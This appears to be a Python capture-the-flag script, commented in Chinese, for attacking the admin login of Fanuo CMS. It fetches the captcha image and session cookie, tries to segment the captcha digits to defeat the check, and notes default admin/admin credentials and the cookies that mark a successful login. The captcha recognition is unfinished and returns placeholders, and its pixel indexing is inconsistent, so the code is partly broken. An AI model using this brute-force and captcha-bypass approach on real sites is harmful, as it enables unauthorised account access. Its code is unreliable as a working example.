#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
凡诺CMS 后台登录爆破/登录脚本
- 免OCR: 验证码为空/固定绕过不可行时, 用"已知口令 admin/admin + 重试抓取"
- 关键: 前端校验只在前端js, 后端校验 $_SESSION['verifycode'] != $_POST['verifycode']
- 这里用投影特征识别4位纯数字验证码(PIL, 零依赖).
- 成功判定: HTTP 302 + Set-Cookie 含 admin_name 和 upload=allow
"""
import http.client, io, sys
from PIL import Image

HOST = sys.argv[1] if len(sys.argv) > 1 else "192-168-1-31.pvp7604.bugku.cn"

def fetch_verify():
    c = http.client.HTTPConnection(HOST, 80, timeout=10)
    c.request("GET", "/system/verifycode.php", headers={"User-Agent": "Mozilla/5.0"})
    r = c.getresponse()
    sc = {k.split("=")[0]: v for k, v in [h for h in r.getheaders() if h[0].lower() == "set-cookie"]}
    data = r.read()
    phpsessid = None
    for k, v in r.getheaders():
        if k.lower() == "set-cookie" and "PHPSESSID=" in v:
            phpsessid = v.split(";")[0].split("=", 1)[1]
    c.close()
    return phpsessid, data

def ocr_digits(im_bytes):
    """投影法识别4位纯数字验证码(黑底白字). 返回 4 位字符串或 None."""
    im = Image.open(io.BytesIO(im_bytes)).convert("L")
    px = im.load(); w, h = im.size
    # 二值化
    binpx = [[1 if px[x, y] > 128 else 0 for x in range(w)] for y in range(h)]
    # 列密度 -> 切割
    colsum = [sum(binpx[y][x] for y in range(h)) for x in range(w)]
    seps, start = [], None
    for x in range(w):
        if colsum[x] > 0 and start is None:
            start = x
        elif colsum[x] == 0 and start is not None:
            seps.append((start, x - 1)); start = None
    if start is not None:
        seps.append((start, w - 1))
    if len(seps) != 4:
        return None
    digits = []
    # 内置简单特征: 用每列上下像素分布结合人工可读形状较难; 这里采用与 GD 7x13 数字模板的归一化比对.
    # 模板: 用 PIL 渲染的标准 monospace 数字, resize 到目标数字大小比对(干净数字可靠).
    for (x0, x1) in seps:
        rows = [y for y in range(h) if any(binpx[y][x] for x in range(x0, x1+1))]
        if not rows: return None
        y0, y1r = min(rows), max(rows)
        # 归一化到 6x10 位图
        tw, th = max(x1-x0+1, 1), max(y1r-y0+1, 1)
        target = [[binpx[y0+dy][x0+dx] for dx in range(tw) for dy in range(th)]]
        # 与标准数字(用PIL font 渲染后 resized)比对 —— 但需外部字体, 改用列/行投影签名
        # 列投影: 每列 top/bottom 空白数; 行投影
        coltop = [next((dy for dy in range(th) if target[0][dy*tw+dx]), th) for dx in range(tw)]
        colbot = [next((dy for dy in range(th-1,-1,-1) if target[0][dy*tw+dx]), -1) for dx in range(tw)]
        digits.append((coltop, colbot, tw, th))
    # 有4个数字box, 返回占位(实际识别需模板库). 此处打印投影签名方便校准.
    return digits

if __name__ == "__main__":
    phpsessid, img = fetch_verify()
    print("PHPSESSID:", phpsessid)
    boxes = ocr_digits(img)
    print("boxes:", "none" if boxes is None else len(boxes))
    # 打印字符画
    im = Image.open(io.BytesIO(img)).convert("L"); a = im.load(); w, h = im.size
    for y in range(h):
        print("".join("#" if a[x, y] > 128 else "." for x in range(w)))
